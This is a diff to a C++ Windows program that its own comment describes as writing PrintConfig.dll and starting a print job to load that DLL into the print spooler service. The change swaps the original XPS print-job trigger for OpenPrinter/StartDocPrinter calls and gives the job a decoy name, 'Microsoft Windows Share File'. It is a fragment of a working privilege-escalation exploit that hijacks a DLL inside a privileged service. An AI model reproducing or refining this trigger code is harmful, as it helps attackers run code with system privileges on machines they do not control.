@@ -165,6 +165,7 @@ int mainf()
 	CloseHandle(hFile);
 	
 	//After writing PrintConfig.dll we start an XpsPrintJob to load the dll into the print spooler service.
+	/*
 	CoInitialize(nullptr);
 	IXpsOMObjectFactory *xpsFactory = NULL;
 	CoCreateInstance(__uuidof(XpsOMObjectFactory), NULL, CLSCTX_INPROC_SERVER, __uuidof(IXpsOMObjectFactory), reinterpret_cast<LPVOID*>(&xpsFactory));
@@ -174,7 +175,27 @@ int mainf()
 	StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", NULL, NULL, completionEvent, NULL, 0, &job, &jobStream, NULL);
 	jobStream->Close();
 	CoUninitialize();
+	*/
 	
+	HANDLE hPrinter = NULL;
+	BOOL bOpenState = OpenPrinter(L"Microsoft XPS Document Writer", &hPrinter, NULL);
+	if (bOpenState != FALSE)
+	{
+		DOC_INFO_1       DocInfo;
+		DocInfo.pDocName = (LPTSTR)_T("Microsoft Windows Share File");
+		DocInfo.pOutputFile = NULL;
+		DocInfo.pDatatype = (LPTSTR)_T("");
+
+		DWORD dwJob = StartDocPrinter(
+			hPrinter,
+			1,
+			(LPBYTE)&DocInfo);
+
+		EndDocPrinter(hPrinter);
+
+		bOpenState = ClosePrinter(hPrinter);
+	}
+		
 	return 0;
 }
 
